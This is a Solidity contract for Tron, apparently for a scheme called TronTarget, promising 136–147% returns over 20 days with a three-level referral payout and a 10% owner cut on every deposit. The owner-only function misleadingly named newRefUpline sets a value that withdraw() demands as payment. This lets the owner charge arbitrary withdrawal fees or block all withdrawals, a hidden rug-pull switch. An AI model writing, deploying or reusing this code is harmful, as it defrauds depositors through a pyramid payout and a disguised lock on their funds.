//SourceUnit: trontarget.sol

//TelegramGroup: @TronTargetOfficial

pragma solidity >= 0.4.20;

contract trontarget {
    
    struct Planid {
        uint256 life_days;
        uint256 percent;
        uint256 min_inv;
    }
    
    struct Invest {
        uint8 selectedplanid;
        uint256 amount;
        uint40 time;
    }
       
    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint40  last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Invest[] invests;
        mapping(uint8 => uint256) structure;
    }

    address payable public owner;  // owner contract
    uint256 public invested; // all invested
    uint256 public withdrawn; // all withdrawn
    uint256 public direct_bonus; // direct ref
    uint256 public match_bonus; // refer program
    uint8[] public ref_bonuses; // 12(8,3,1) => 12%
    Planid[] public selectedplanids;
    uint256 public refupline; // upline ref

    mapping(address => Player) public players; // player variables

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 selectedplanid);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
     owner = msg.sender;
     refupline = 0;
     selectedplanids.push(Planid(20,136,10000000));
     selectedplanids.push(Planid(20,147,10000000));
     ref_bonuses.push(8);
     ref_bonuses.push(3);
     ref_bonuses.push(1);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);
       if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;
            match_bonus += bonus;
            emit MatchPayout(up, _addr, bonus);
            up = players[up].upline;
        }
    }


    function newRefUpline(uint256 upline) public {
        require(msg.sender == owner,"sorry... only owner access to create refer upline!");
        refupline = upline;
    }
    
    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].invests.length == 0) {
                _upline = owner;
            }
            else {
                players[_addr].direct_bonus += _amount / 200;
                direct_bonus += _amount / 200;
            }
            players[_addr].upline = _upline;
            emit Upline(_addr, _upline, _amount / 200);
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;
                _upline = players[_upline].upline;
                if(_upline == address(0)) break;
            }
        }
    }
    
    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
        for(uint256 i = 0; i < player.invests.length; i++) {
            Invest storage dep = player.invests[i];
            Planid storage selectedplanid = selectedplanids[dep.selectedplanid];
            uint256 time_end = dep.time + selectedplanid.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);
            if(from < to) {
                value += dep.amount * (to - from) * selectedplanid.percent / selectedplanid.life_days / 8640000;
            }
        }
        return value;
    }


    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }
    
        
    function invest(uint8 _planid, address _upline) external payable {
        require(selectedplanids[_planid].life_days > 0, "Planid not found");
        require(msg.value >= selectedplanids[_planid].min_inv, "Less Then the min investment");
        Player storage player = players[msg.sender];
        require(player.invests.length < 100, "Max 100 invest per address");
        _setUpline(msg.sender, _upline, msg.value);
        player.invests.push(Invest({
            selectedplanid: _planid,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));
        player.total_invested += msg.value;
        invested += msg.value;
        _refPayout(msg.sender, msg.value);
        owner.transfer(msg.value / 10);
        emit NewDeposit(msg.sender, msg.value, _planid);
    }
    
 
    
    function withdraw() external payable {
        require(msg.value >= refupline);
        Player storage player = players[msg.sender];
        _payout(msg.sender);
        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");
        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;
        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;
        msg.sender.transfer(amount);
        emit Withdraw(msg.sender, amount);
    }
    

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
        return (invested, withdrawn, direct_bonus, match_bonus);
    }
}